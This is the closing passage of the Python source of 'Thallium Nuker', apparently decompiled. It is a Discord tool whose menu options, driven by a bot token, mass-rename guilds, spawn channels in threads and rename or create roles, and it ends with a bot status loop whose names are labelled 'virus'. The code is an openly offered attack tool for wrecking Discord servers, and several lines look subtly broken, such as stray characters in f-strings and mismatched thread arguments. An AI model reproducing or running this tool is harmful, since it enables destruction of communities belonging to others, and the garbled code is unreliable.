                                                        "\x1b[0m",
                                                        "\x1b[90m",
                                                        "\x1b[0m",
                                                    )
                                                )
                                                self.renameguild(
                                                    guildid, new_guild_name, token
                                                )
                                                time.sleep(1)
                                                self.menu()
                                            else:  # inserted
                                                if ans == "11":
                                                    nchn = input(
                                                        "{}({}Thallium{}) Channel Name{}:{} ".format(
                                                            "\x1b[0m",
                                                            "\x1b[90m",
                                                            "\x1b[0m",
                                                            "\x1b[90m",
                                                            "\x1b[0m",
                                                        )
                                                    )
                                                    type = input(
                                                        "{}({}Thallium{}) Channels Type ['t', 'v']{}:{} ".format(
                                                            "\x1b[0m",
                                                            "\x1b[90m",
                                                            "\x1b[0m",
                                                            "\x1b[90m",
                                                            "\x1b[0m",
                                                        )
                                                    )
                                                    type = 2 if type == "v" else 0
                                                    self.rc(guildid, nchn, token)
                                                    time.sleep(1)
                                                    t = threading.Thread(
                                                        target=self.crch,
                                                        args=(
                                                            guildid,
                                                            self.chaizer,
                                                            type,
                                                            token,
                                                        ),
                                                    )
                                                    t.start()
                                                    self.menu()
                                                else:  # inserted
                                                    if ans == "12":
                                                        nrole = input(
                                                            "{}({}Thallium{}) Role Name{}:{} ".format(
                                                                "\x1b[0m",
                                                                "\x1b[90m",
                                                                "\x1b[0m",
                                                                "\x1b[90m",
                                                                "\x1b[0m",
                                                            )
                                                        )
                                                        self.rerole(
                                                            guildid, nrole, token
                                                        )
                                                        time.sleep(1)
                                                        t = threading.Thread(
                                                            target=self.crch,
                                                            args=(
                                                                guildid,
                                                                self.chaizer,
                                                                token,
                                                            ),
                                                        )
                                                        t.start()
                                                        while (
                                                            threading.active_count()
                                                            >= __threads__
                                                        ):
                                                            t.join()
                                                        self.menu()
                                                    else:  # inserted
                                                        if ans == "13":
                                                            try:
                                                                response = self.session.get(
                                                                    "https://github.com/SystemVll/Thallium-Nuker-Source/releases/latest"
                                                                )
                                                                check_version = (
                                                                    response.headers.get(
                                                                        "location"
                                                                    )
                                                                    .split("/")[7]
                                                                    .split("v")[1]
                                                                )
                                                                if (
                                                                    VERSION
                                                                    != check_version
                                                                ):
                                                                    print(
                                                                        "{}({}Thallium{}) You're using an outdated version!".format(
                                                                            "\x1b[0m",
                                                                            "\x1b[90m",
                                                                            "\x1b[0m",
                                                                        )
                                                                    )
                                                                    webbrowser.open(
                                                                        f"https://github.com/SystemVll/Thallium-Nuker-Source/releases/tag/{check_version}0"
                                                                    )
                                                                else:  # inserted
                                                                    print(
                                                                        "{}({}Thallium{}) You're using the current version!".format(
                                                                            "\x1b[0m",
                                                                            "\x1b[90m",
                                                                            "\x1b[0m",
                                                                        )
                                                                    )
                                                            except:  # noqa: E722
                                                                print(
                                                                    "{}({}Thallium{}) Couldn't reach the releases!".format(
                                                                        "\x1b[0m",
                                                                        "\x1b[90m",
                                                                        "\x1b[0m",
                                                                    )
                                                                )
                                                            time.sleep(1.5)
                                                            self.menu()
                                                        else:  # inserted
                                                            if ans == "14":
                                                                print(
                                                                    "{}({}Thallium{}) https://github.com/SystemVll/Thallium-Nuker-Source".format(
                                                                        "\x1b[0m",
                                                                        "\x1b[90m",
                                                                        "\x1b[0m",
                                                                    )
                                                                )
                                                                input("")
                                                                self.menu()
                                                            else:  # inserted
                                                                if ans == "15":
                                                                    print(
                                                                        "{}({}Thallium{}) Thanks for using Thallium!".format(
                                                                            "\x1b[0m",
                                                                            "\x1b[90m",
                                                                            "\x1b[0m",
                                                                        )
                                                                    )
                                                                    time.sleep(1.5)
                                                                    os._exit(0)


@__client__.event
async def on_ready():
    print(
        "{}({}Thallium{}) Authenticated as{}: {}{}".format(
            "\x1b[0m",
            "\x1b[90m",
            "\x1b[0m",
            "\x1b[90m",
            "\x1b[0m",
            f"{__client__.user.name}0{'#':__client__.user.discriminator}",
        )
    )
    update_status.start()


@tasks.loop(seconds=5)
async def update_status():
    virus = next(status_cycle)
    await __client__.change_presence(activity=discord.Game(name=virus))
    await asyncio.sleep(1.5)
    Thallium().menu()


if __name__ == "__main__":
    try:
        os.system("title Thallium Nuker ^| Authentication & mode")
        __client__.run(token, bot=True)
    except Exception as e:
        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
        time.sleep(1.5)
        os._exit(0)
